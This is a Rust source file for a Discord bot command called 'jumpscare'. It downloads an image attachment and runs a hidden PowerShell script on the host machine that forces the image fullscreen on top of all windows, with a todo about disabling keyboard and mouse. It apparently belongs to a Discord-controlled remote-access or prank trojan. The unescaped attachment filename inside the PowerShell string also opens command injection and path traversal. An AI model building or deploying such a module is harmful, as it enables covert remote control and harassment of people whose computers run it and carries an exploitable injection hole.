use crate::prelude::*;
use std::env;
use powershell_script::PsScriptBuilder;

// todo: support video and disable keyboard and mouse
#[poise::command(prefix_command, aliases("scare"))]
pub async fn jumpscare(
    ctx: PoiseContext<'_>,
    #[description = "Duration in seconds"] duration: u64,
    #[description = "Image file"] file: Option<serenity::Attachment>,
) -> Result<(), Error> {
    let attachment = match file {
        Some(att) => att,
        None => {
            if let poise::Context::Prefix(p_ctx) = ctx {
                if let Some(att) = p_ctx.msg.attachments.first() {
                     att.clone()
                } else {
                     ctx.say("Please attach an image for the jumpscare.").await?;
                     return Ok(());
                }
            } else {
                ctx.say("Usage: `.jumpscare <seconds> [attachment]`").await?;
                return Ok(());
            }
        }
    };

    let filename = &attachment.filename;
    let ext = filename.split('.').last().unwrap_or("").to_lowercase();
    if !["png", "jpg", "jpeg", "bmp", "gif"].contains(&ext.as_str()) {
         ctx.say("Invalid image format.").await?;
         return Ok(());
    }

    let reply = ctx.say("Downloading jumpscare asset...").await?;

    let temp_dir = env::temp_dir();
    let file_path = temp_dir.join(filename);
    let content = attachment.download().await?;
    tokio::fs::write(&file_path, &content).await?;
    
    let file_path_str = file_path.to_string_lossy();
    
    reply.edit(ctx, poise::CreateReply::default().content(format!("Jumpscaring for {} seconds...", duration))).await?;

    let script = format!(r#"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Jumpscare"
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.BackgroundImageLayout = [System.Windows.Forms.ImageLayout]::Stretch

try {{
    $img = [System.Drawing.Image]::FromFile('{}')
    $form.BackgroundImage = $img
}} catch {{
    Write-Host "Failed to load image"
    exit
}}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = {}
$timer.Add_Tick({{
    $form.Close()
}})
$timer.Start()

$form.ShowDialog() | Out-Null
$img.Dispose()
"#, file_path_str, duration * 1000);

    let _ = tokio::task::spawn_blocking(move || {
        PsScriptBuilder::new()
            .no_profile(true)
            .non_interactive(true)
            .hidden(true)
            .print_commands(false)
            .build()
            .run(&script)
    }).await;
    
    let cleanup_path = file_path.clone();
    tokio::fs::remove_file(cleanup_path).await.ok();
    
    reply.edit(ctx, poise::CreateReply::default().content("Jumpscare completed.")).await?;

    Ok(())
}
